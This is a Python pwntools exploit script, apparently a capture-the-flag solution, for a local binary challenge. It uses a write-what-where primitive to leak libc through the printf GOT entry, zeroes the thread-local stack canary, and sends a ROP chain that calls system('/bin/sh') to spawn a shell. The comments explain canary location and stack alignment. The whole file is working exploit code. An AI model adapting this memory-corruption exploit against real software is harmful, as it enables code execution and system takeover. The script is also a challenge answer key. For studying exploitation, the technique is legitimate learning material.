#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("../challenge/chall")
libc = ELF("../src/libc.so.6")

def start():
    if args.GDB:
        io = gdb.debug([exe.path])
    elif args.REMOTE:
        io = remote("localhost", 2045)
    else:
        io = process([exe.path])

    return io

io = start()


def main():
    message_2 = 0x404050 + 0x8
    printf_got = 0x403fc8

    # Use a GOT entry to leak the libc
    io.recvuntil(b"where: \n")
    io.sendline(str(message_2).encode())
    io.recvuntil(b"what: \n")
    io.sendline(str(printf_got).encode())
    libc.address = u64(io.recv(6) + b"\x00\x00") - libc.sym["printf"]

    # overwrite the original canary
    # you can get the address of this canary by either using the `search` command in gdb
    # or call the arch_prctl(ARCH_GET_FS, $rsp) in gdb
    log.info(f"libc @ {hex(libc.address)}")
    global_canary = libc.address - 0x2898

    io.recvuntil(b"where: \n")
    io.sendline(str(global_canary).encode())
    io.recvuntil(b"what: \n")
    io.sendline(str(0).encode())

    POP_RDI = libc.address + 0x2a3e5
    RET = POP_RDI + 1

    io.recvuntil(b"later\n")
    # you can notice one additional RET in the ROP chain
    # if you don't know some libc functions use the movaps instruction that will segfault if the stack is not 16 byte aligned
    io.sendline(b"\x00"*0x38 + p64(POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(RET) + p64(libc.sym["system"]))

    io.interactive()

if __name__ == "__main__":
    main()

        
        

